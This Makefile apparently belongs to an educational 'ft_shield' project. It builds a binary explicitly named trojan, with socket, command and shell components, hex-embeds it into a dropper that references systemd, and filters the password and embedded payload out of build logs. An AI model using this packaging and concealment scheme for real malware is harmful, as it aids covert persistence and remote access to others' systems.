MAKEFLAGS += -j$(nproc)
MAKEFLAGS += --no-print-directory

CC = cc
CFLAGS = -Wall -Wextra -Werror

ifeq ($(PASSWORD),)
$(error you need to compile with make PASSWORD=...)
endif
CPPFLAGS = -DPASSWORD=\"$(PASSWORD)\"

MKDIR = mkdir -p
XXD = xxd

NAME = ft_shield
TROJAN = trojan

OBJS = $(addprefix o/,\
	   ft_shield.o\
	   systemd.o\
	   )

TROJAN_OBJS = $(addprefix o/,\
			  trojan.o\
			  lock.o\
			  socket.o\
			  commands.o\
			  shell.o\
			  )

VPATH = $(wildcard s/*/) s/

all: $(NAME)

$(NAME): $(TROJAN) .WAIT $(OBJS)
	$(CC) $(LDFLAGS) $(OBJS) -o $@ $(LDLIBS)

$(TROJAN): $(TROJAN_OBJS)
	$(CC) $(LDFLAGS) $(TROJAN_OBJS) -o $@ $(LDLIBS)

o:
	@$(MKDIR) $@

define strip-sensitive
	@exec 2> >( stdbuf -oL sed '
	s/\+\+\? //
	s/\x27-DPASSWORD=[^ ]\+ //g
	s/\x27-DTROEXE=[^ ]\+ //g
	/code/d
	/xxd/d
	/sed/d
	' )
	set -x
endef

.ONESHELL:
o/%.o: %.c | o
	$(call strip-sensitive)
	$(CC) $(CPPFLAGS) $(CFLAGS) $< -c -o o/$(notdir $@)

.ONESHELL:
o/ft_shield.o: s/ft_shield.c $(TROJAN_OBJS)
	$(call strip-sensitive)
	code=$$($(XXD) -c0 -p < $(TROJAN) | sed 's/../\\x&/g')
	$(CC) -DTROEXE=\"$$code\" $(CPPFLAGS) $(CFLAGS) $< -c -o o/$(notdir $@)

clean:
	$(RM) $(OBJS) $(TROJAN_OBJS)

fclean: clean
	$(RM) $(NAME) $(TROJAN)

re: fclean .WAIT all

.PHONY: all clean fclean re
